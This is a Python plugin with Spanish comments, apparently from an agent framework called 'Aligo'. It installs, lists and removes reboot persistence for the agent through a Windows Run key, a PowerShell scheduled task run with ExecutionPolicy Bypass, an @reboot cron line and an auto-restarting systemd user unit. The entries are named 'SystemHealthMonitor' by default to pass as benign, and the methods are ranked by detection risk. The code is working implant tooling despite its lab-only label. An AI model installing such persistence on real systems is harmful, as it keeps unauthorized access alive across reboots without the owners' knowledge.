"""
plugins/persist.py — Mecanismos de persistencia del agente (post-reboot).

Uso exclusivo en entornos de laboratorio autorizados.

Metodos soportados:
  windows_run_key        HKCU Run key (bajo riesgo de deteccion, no requiere admin)
  windows_scheduled_task Tarea programada AtLogOn (medio riesgo)
  linux_cron             Entrada @reboot en crontab del usuario (medio riesgo)
  linux_systemd          Unidad systemd de usuario (medio riesgo)

Acciones:
  install   args: {method, name?, agent_cmd?}
  uninstall args: {method, name?}
  status    sin args
"""

from __future__ import annotations

import asyncio
import os
import platform
import sys
from pathlib import Path
from typing import Any

from .base import BasePlugin

_DEFAULT_NAME = "SystemHealthMonitor"


def _self_cmd() -> str:
    """Retorna el comando que relanza este agente."""
    exe = sys.executable
    script = str(Path(sys.argv[0]).resolve()) if sys.argv else ""
    return f'"{exe}" "{script}"' if script else f'"{exe}"'


class PersistPlugin(BasePlugin):
    name = "persist"
    version = "1.0.0"
    author = "Aligo"
    description = "Persistencia post-reboot: Run key, Scheduled Task, Cron, Systemd"

    RISK_MAP = {
        "windows_run_key":        "HIGH",
        "windows_scheduled_task": "MEDIUM",
        "linux_cron":             "MEDIUM",
        "linux_systemd":          "MEDIUM",
    }

    def actions(self) -> list[str]:
        return ["install", "uninstall", "status"]

    async def execute(self, action: str, args: dict[str, Any]) -> Any:
        method    = args.get("method", "")
        name      = args.get("name", _DEFAULT_NAME)
        agent_cmd = args.get("agent_cmd", _self_cmd())

        if action == "install":
            return await self._install(method, name, agent_cmd)
        if action == "uninstall":
            return await self._uninstall(method, name)
        if action == "status":
            return await self._status()
        return {"error": f"Accion no reconocida: {action}"}

    # ------------------------------------------------------------------
    # Install
    # ------------------------------------------------------------------

    async def _install(self, method: str, name: str, agent_cmd: str) -> dict:
        if method == "windows_run_key":
            return await self._win_run_key_set(name, agent_cmd)
        if method == "windows_scheduled_task":
            return await self._win_schtask_create(name, agent_cmd)
        if method == "linux_cron":
            return await self._linux_cron_add(name, agent_cmd)
        if method == "linux_systemd":
            return await self._linux_systemd_enable(name, agent_cmd)
        available = ["windows_run_key", "windows_scheduled_task"] if platform.system() == "Windows" \
                    else ["linux_cron", "linux_systemd"]
        return {"ok": False, "error": f"Metodo '{method}' no soportado. Disponibles: {available}"}

    async def _win_run_key_set(self, name: str, cmd: str) -> dict:
        try:
            import winreg
            KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, name, 0, winreg.REG_SZ, cmd)
            return {
                "ok": True, "method": "windows_run_key",
                "registry_key": f"HKCU\\{KEY}\\{name}",
                "command": cmd, "risk": "HIGH",
                "note": "Se ejecuta al iniciar sesion del usuario actual",
            }
        except Exception as exc:
            return {"ok": False, "method": "windows_run_key", "error": str(exc)}

    async def _win_schtask_create(self, name: str, cmd: str) -> dict:
        parts = cmd.split(None, 1)
        exe  = parts[0].strip('"')
        args = parts[1] if len(parts) > 1 else ""
        ps = (
            f'$a = New-ScheduledTaskAction -Execute "{exe}" -Argument \'{args}\';'
            f'$t = New-ScheduledTaskTrigger -AtLogOn;'
            f'$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1);'
            f'Register-ScheduledTask -TaskName "{name}" -Action $a -Trigger $t -Settings $s -Force | Out-Null;'
            f'echo "OK"'
        )
        proc = await asyncio.create_subprocess_exec(
            "powershell", "-NonInteractive", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        ok = proc.returncode == 0
        return {
            "ok": ok, "method": "windows_scheduled_task",
            "task_name": name, "risk": "MEDIUM",
            "stdout": stdout.decode(errors="replace").strip(),
            "stderr": stderr.decode(errors="replace").strip() if not ok else "",
            "note": "Requiere que el usuario cierre sesion/reinicie para activar",
        }

    async def _linux_cron_add(self, name: str, cmd: str) -> dict:
        marker = f"# aligo:{name}"
        cron_line = f"@reboot {cmd} {marker}"
        try:
            proc = await asyncio.create_subprocess_exec(
                "crontab", "-l",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            existing, _ = await proc.communicate()
            current = existing.decode(errors="replace")
            if marker in current:
                return {"ok": True, "method": "linux_cron", "note": "Ya instalado"}
            new_cron = current.rstrip("\n") + f"\n{cron_line}\n"
            proc2 = await asyncio.create_subprocess_exec(
                "crontab", "-",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            _, err2 = await proc2.communicate(new_cron.encode())
            ok = proc2.returncode == 0
            return {
                "ok": ok, "method": "linux_cron", "cron_entry": cron_line, "risk": "MEDIUM",
                "stderr": err2.decode(errors="replace").strip() if not ok else "",
            }
        except FileNotFoundError:
            return {"ok": False, "error": "crontab no disponible en este sistema"}
        except Exception as exc:
            return {"ok": False, "error": str(exc)}

    async def _linux_systemd_enable(self, name: str, cmd: str) -> dict:
        unit_dir = Path.home() / ".config" / "systemd" / "user"
        unit_dir.mkdir(parents=True, exist_ok=True)
        unit_file = unit_dir / f"{name}.service"
        unit_file.write_text(
            f"[Unit]\nDescription={name}\nAfter=network.target\n\n"
            f"[Service]\nExecStart={cmd}\nRestart=always\nRestartSec=10\n\n"
            f"[Install]\nWantedBy=default.target\n"
        )
        try:
            proc = await asyncio.create_subprocess_exec(
                "systemctl", "--user", "enable", "--now", f"{name}.service",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            out, err = await proc.communicate()
            ok = proc.returncode == 0
            return {
                "ok": ok, "method": "linux_systemd",
                "unit_file": str(unit_file), "risk": "MEDIUM",
                "stdout": out.decode(errors="replace").strip(),
                "stderr": err.decode(errors="replace").strip() if not ok else "",
            }
        except FileNotFoundError:
            return {"ok": False, "error": "systemctl no disponible"}
        except Exception as exc:
            return {"ok": False, "error": str(exc)}

    # ------------------------------------------------------------------
    # Uninstall
    # ------------------------------------------------------------------

    async def _uninstall(self, method: str, name: str) -> dict:
        if method == "windows_run_key":
            try:
                import winreg
                KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY, 0, winreg.KEY_SET_VALUE) as k:
                    winreg.DeleteValue(k, name)
                return {"ok": True, "removed": f"HKCU\\{KEY}\\{name}"}
            except FileNotFoundError:
                return {"ok": True, "note": "Entrada no encontrada (ya eliminada)"}
            except Exception as exc:
                return {"ok": False, "error": str(exc)}

        if method == "windows_scheduled_task":
            proc = await asyncio.create_subprocess_exec(
                "schtasks", "/delete", "/tn", name, "/f",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            out, _ = await proc.communicate()
            return {"ok": proc.returncode == 0, "method": method, "stdout": out.decode(errors="replace").strip()}

        if method == "linux_cron":
            marker = f"# aligo:{name}"
            try:
                proc = await asyncio.create_subprocess_exec(
                    "crontab", "-l", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                )
                cur, _ = await proc.communicate()
                filtered = "\n".join(
                    l for l in cur.decode(errors="replace").splitlines() if marker not in l
                ) + "\n"
                proc2 = await asyncio.create_subprocess_exec(
                    "crontab", "-",
                    stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                )
                await proc2.communicate(filtered.encode())
                return {"ok": proc2.returncode == 0, "method": method}
            except Exception as exc:
                return {"ok": False, "error": str(exc)}

        if method == "linux_systemd":
            proc = await asyncio.create_subprocess_exec(
                "systemctl", "--user", "disable", "--now", f"{name}.service",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate()
            unit = Path.home() / ".config" / "systemd" / "user" / f"{name}.service"
            unit.unlink(missing_ok=True)
            return {"ok": True, "method": method, "removed": str(unit)}

        return {"ok": False, "error": f"Metodo no soportado: {method}"}

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    async def _status(self) -> dict:
        active: dict[str, Any] = {}

        if platform.system() == "Windows":
            # Run key
            try:
                import winreg
                KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
                entries = {}
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, KEY) as k:
                    i = 0
                    while True:
                        try:
                            vname, val, _ = winreg.EnumValue(k, i)
                            if "python" in val.lower() or "aligo" in val.lower() or "agent" in val.lower():
                                entries[vname] = val
                            i += 1
                        except OSError:
                            break
                active["windows_run_key"] = {"installed": bool(entries), "entries": entries}
            except Exception as exc:
                active["windows_run_key"] = {"error": str(exc)}

            # Scheduled tasks
            proc = await asyncio.create_subprocess_exec(
                "schtasks", "/query", "/fo", "CSV", "/nh",
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            out, _ = await proc.communicate()
            tasks = []
            for line in out.decode(errors="replace").splitlines():
                if line.strip():
                    parts = line.strip('"').split('","')
                    if parts:
                        tasks.append(parts[0])
            active["windows_scheduled_tasks"] = {"count": len(tasks), "names": tasks[:20]}

        else:
            # Linux cron
            try:
                proc = await asyncio.create_subprocess_exec(
                    "crontab", "-l", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                )
                out, _ = await proc.communicate()
                cron = out.decode(errors="replace")
                aligo_entries = [l for l in cron.splitlines() if "# aligo:" in l]
                active["linux_cron"] = {"installed": bool(aligo_entries), "aligo_entries": aligo_entries}
            except Exception as exc:
                active["linux_cron"] = {"error": str(exc)}

            # Systemd
            try:
                proc = await asyncio.create_subprocess_exec(
                    "systemctl", "--user", "list-units", "--type=service", "--state=active",
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                )
                out, _ = await proc.communicate()
                active["linux_systemd"] = {
                    "output": out.decode(errors="replace")[:500]
                }
            except Exception as exc:
                active["linux_systemd"] = {"error": str(exc)}

        return {
            "ok": True,
            "platform": platform.system(),
            "mechanisms": active,
            "available_methods": list(self.RISK_MAP.keys()),
        }
